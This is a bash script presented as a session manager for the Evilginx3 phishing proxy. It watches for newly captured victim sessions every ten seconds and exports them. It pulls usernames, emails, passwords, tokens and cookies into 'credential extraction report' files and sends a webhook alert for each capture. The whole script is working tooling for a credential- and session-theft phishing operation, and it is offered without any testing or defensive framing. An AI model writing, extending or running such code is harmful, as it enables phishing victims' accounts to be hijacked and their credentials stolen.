#!/bin/bash
# === EVILGINX3 SESSION MANAGER ===
# Purpose: Advanced session monitoring, extraction, and management
# Features: Real-time monitoring, credential extraction, session replay

set -euo pipefail

### === CONFIGURATION ===
EVILGINX_DIR="/opt/posh-ai/evilginx3"
EVILGINX_BIN="$EVILGINX_DIR/evilginx"
SESSION_DIR="$EVILGINX_DIR/sessions"
EXPORT_DIR="$EVILGINX_DIR/exports"
LOG_FILE="$EVILGINX_DIR/logs/session_manager.log"

### === UTILITIES ===
log() { 
    echo -e "\033[1;35m[SESSION-MGR]\033[0m $*"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" >> "$LOG_FILE"
}
warn() { echo -e "\033[1;33m[WARNING]\033[0m $*"; }
error() { echo -e "\033[1;31m[ERROR]\033[0m $*" >&2; }
fatal() { error "$*"; exit 1; }

### === INITIALIZATION ===
init_directories() {
    mkdir -p "$SESSION_DIR" "$EXPORT_DIR" "$(dirname "$LOG_FILE")"
    chmod 700 "$SESSION_DIR" "$EXPORT_DIR"
}

### === SESSION MONITORING ===
monitor_sessions() {
    log "Starting real-time session monitoring..."
    local last_count=0
    
    while true; do
        local current_sessions
        current_sessions=$(get_session_count)
        
        if [[ "$current_sessions" -gt "$last_count" ]]; then
            log "New session detected! Total sessions: $current_sessions"
            export_latest_session
            send_notification "New Evilginx3 session captured"
        fi
        
        last_count="$current_sessions"
        sleep 10
    done
}

get_session_count() {
    echo "sessions" | "$EVILGINX_BIN" -p "$EVILGINX_DIR/phishlets" 2>/dev/null | \
        grep -c "^\[" || echo "0"
}

### === SESSION EXTRACTION ===
export_all_sessions() {
    log "Exporting all sessions..."
    local timestamp
    timestamp=$(date +%Y%m%d_%H%M%S)
    local export_file="$EXPORT_DIR/sessions_${timestamp}.json"
    
    echo "sessions" | "$EVILGINX_BIN" -p "$EVILGINX_DIR/phishlets" > "$export_file" 2>/dev/null
    
    if [[ -s "$export_file" ]]; then
        log "Sessions exported to: $export_file"
        parse_sessions "$export_file"
    else
        warn "No sessions found to export"
        rm -f "$export_file"
    fi
}

export_latest_session() {
    local timestamp
    timestamp=$(date +%Y%m%d_%H%M%S)
    local export_file="$EXPORT_DIR/latest_session_${timestamp}.json"
    
    echo "sessions" | "$EVILGINX_BIN" -p "$EVILGINX_DIR/phishlets" | tail -n 1 > "$export_file" 2>/dev/null
    
    if [[ -s "$export_file" ]]; then
        log "Latest session exported to: $export_file"
        parse_sessions "$export_file"
    fi
}

### === CREDENTIAL PARSING ===
parse_sessions() {
    local session_file="$1"
    local creds_file="${session_file%.json}_credentials.txt"
    local summary_file="${session_file%.json}_summary.txt"
    
    log "Parsing session data from: $session_file"
    
    # Extract credentials (this is a simplified parser - real implementation would be more complex)
    {
        echo "=== CREDENTIAL EXTRACTION REPORT ==="
        echo "Generated: $(date)"
        echo "Source: $session_file"
        echo ""
        
        if grep -q "username\|email\|login" "$session_file" 2>/dev/null; then
            echo "CREDENTIALS FOUND:"
            echo "=================="
            grep -i "username\|email\|login\|password" "$session_file" 2>/dev/null || echo "No clear-text credentials found"
        else
            echo "No credentials detected in session data"
        fi
        
        echo ""
        echo "TOKENS AND COOKIES:"
        echo "==================="
        grep -i "token\|cookie\|auth" "$session_file" 2>/dev/null || echo "No tokens found"
        
    } > "$creds_file"
    
    # Generate summary
    {
        echo "=== SESSION SUMMARY ==="
        echo "Timestamp: $(date)"
        echo "Total Sessions: $(wc -l < "$session_file")"
        echo "Credentials File: $creds_file"
        echo "Raw Data: $session_file"
        echo ""
        echo "Recent Activity:"
        tail -n 5 "$session_file" 2>/dev/null || echo "No session data"
    } > "$summary_file"
    
    log "Credentials extracted to: $creds_file"
    log "Summary generated: $summary_file"
}

### === NOTIFICATION SYSTEM ===
send_notification() {
    local message="$1"
    local webhook_url="${WEBHOOK_URL:-}"
    
    if [[ -n "$webhook_url" ]]; then
        curl -s -X POST "$webhook_url" \
            -H "Content-Type: application/json" \
            -d "{\"text\":\"$message\"}" >/dev/null 2>&1 || true
    fi
    
    # Log to system
    logger "Evilginx3: $message"
}

### === SESSION CLEANUP ===
cleanup_old_sessions() {
    local days="${1:-7}"
    log "Cleaning up session exports older than $days days..."
    
    find "$EXPORT_DIR" -name "*.json" -mtime +$days -delete
    find "$EXPORT_DIR" -name "*.txt" -mtime +$days -delete
    
    log "Cleanup completed"
}

### === SESSION STATISTICS ===
show_statistics() {
    log "Generating session statistics..."
    
    local total_exports
    total_exports=$(find "$EXPORT_DIR" -name "*.json" | wc -l)
    
    local today_exports
    today_exports=$(find "$EXPORT_DIR" -name "*.json" -mtime -1 | wc -l)
    
    local current_sessions
    current_sessions=$(get_session_count)
    
    echo ""
    echo "=== EVILGINX3 SESSION STATISTICS ==="
    echo "Current Active Sessions: $current_sessions"
    echo "Total Exported Sessions: $total_exports"
    echo "Sessions Today: $today_exports"
    echo "Export Directory: $EXPORT_DIR"
    echo "Last Export: $(ls -t "$EXPORT_DIR"/*.json 2>/dev/null | head -n1 | xargs ls -l 2>/dev/null || echo 'None')"
    echo ""
    
    if [[ -f "$LOG_FILE" ]]; then
        echo "Recent Activity (last 5 entries):"
        tail -n 5 "$LOG_FILE"
    fi
}

### === INTERACTIVE SESSION VIEWER ===
interactive_viewer() {
    while true; do
        clear
        echo "=== EVILGINX3 SESSION MANAGER ==="
        echo "1. View current sessions"
        echo "2. Export all sessions"
        echo "3. Show statistics"
        echo "4. Start monitoring"
        echo "5. Cleanup old exports"
        echo "6. Exit"
        echo ""
        read -p "Select option [1-6]: " choice
        
        case "$choice" in
            1)
                echo "sessions" | "$EVILGINX_BIN" -p "$EVILGINX_DIR/phishlets" 2>/dev/null || echo "No sessions found"
                read -p "Press Enter to continue..."
                ;;
            2)
                export_all_sessions
                read -p "Press Enter to continue..."
                ;;
            3)
                show_statistics
                read -p "Press Enter to continue..."
                ;;
            4)
                echo "Starting monitoring (Ctrl+C to stop)..."
                monitor_sessions
                ;;
            5)
                read -p "Delete exports older than how many days? [7]: " days
                cleanup_old_sessions "${days:-7}"
                read -p "Press Enter to continue..."
                ;;
            6)
                log "Session manager exited"
                exit 0
                ;;
            *)
                echo "Invalid option"
                sleep 1
                ;;
        esac
    done
}

### === HELP FUNCTION ===
show_help() {
    cat <<EOF
Evilginx3 Session Manager

Usage: $0 [COMMAND] [OPTIONS]

Commands:
  monitor           Start real-time session monitoring
  export            Export all current sessions
  export-latest     Export only the latest session
  stats             Show session statistics
  cleanup [days]    Clean up old exports (default: 7 days)
  interactive       Start interactive session viewer
  help              Show this help message

Environment Variables:
  WEBHOOK_URL       Webhook URL for notifications

Examples:
  $0 monitor                    # Start real-time monitoring
  $0 export                     # Export all sessions
  $0 cleanup 14                 # Clean exports older than 14 days
  $0 interactive                # Start interactive mode

Files:
  Sessions: $SESSION_DIR
  Exports:  $EXPORT_DIR
  Logs:     $LOG_FILE

EOF
}

### === MAIN EXECUTION ===
main() {
    init_directories
    
    case "${1:-interactive}" in
        "monitor")
            monitor_sessions
            ;;
        "export")
            export_all_sessions
            ;;
        "export-latest")
            export_latest_session
            ;;
        "stats"|"statistics")
            show_statistics
            ;;
        "cleanup")
            cleanup_old_sessions "${2:-7}"
            ;;
        "interactive")
            interactive_viewer
            ;;
        "help"|"-h"|"--help")
            show_help
            ;;
        *)
            error "Unknown command: $1"
            show_help
            exit 1
            ;;
    esac
}

# Check if Evilginx binary exists
[[ -x "$EVILGINX_BIN" ]] || fatal "Evilginx binary not found at: $EVILGINX_BIN"

main "$@"
